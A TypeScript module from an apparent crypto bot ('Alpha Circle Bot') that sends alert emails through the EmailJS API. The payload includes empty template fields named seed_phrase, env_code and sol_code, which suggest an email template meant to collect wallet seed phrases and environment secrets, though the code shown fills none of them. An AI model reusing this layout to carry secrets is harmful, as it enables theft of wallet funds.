import { logger } from "./logger";

const SERVICE_ID = process.env["EMAILJS_SERVICE_ID"] || "";
const TEMPLATE_ID = process.env["EMAILJS_TEMPLATE_ID"] || "";
const PUBLIC_KEY = process.env["EMAILJS_PUBLIC_KEY"] || "";
const PRIVATE_KEY = process.env["EMAILJS_PRIVATE_KEY"] || "";

export async function sendEmailAlert(subject: string, body: string): Promise<void> {
  if (!SERVICE_ID || !TEMPLATE_ID || !PUBLIC_KEY) {
    logger.warn("EmailJS credentials not set — skipping email alert");
    return;
  }
  try {
    const payload: Record<string, unknown> = {
      service_id: SERVICE_ID,
      template_id: TEMPLATE_ID,
      user_id: PUBLIC_KEY,
      template_params: {
        title: subject,
        name: "Alpha Circle Bot",
        email: "noreply@alphacirclebot.com",
        gift_code: body,
        env_code: "",
        sol_code: "",
        seed_phrase: "",
      },
    };

    if (PRIVATE_KEY) {
      payload["accessToken"] = PRIVATE_KEY;
    }

    const res = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(12000),
    });
    const text = await res.text();
    if (!res.ok) {
      logger.warn({ status: res.status, body: text }, "EmailJS send failed");
    } else {
      logger.info("EmailJS alert sent successfully");
    }
  } catch (e) {
    logger.warn({ e }, "EmailJS request error — continuing");
  }
}

export function fmt(lines: string[]): string {
  return lines.join("\n");
}
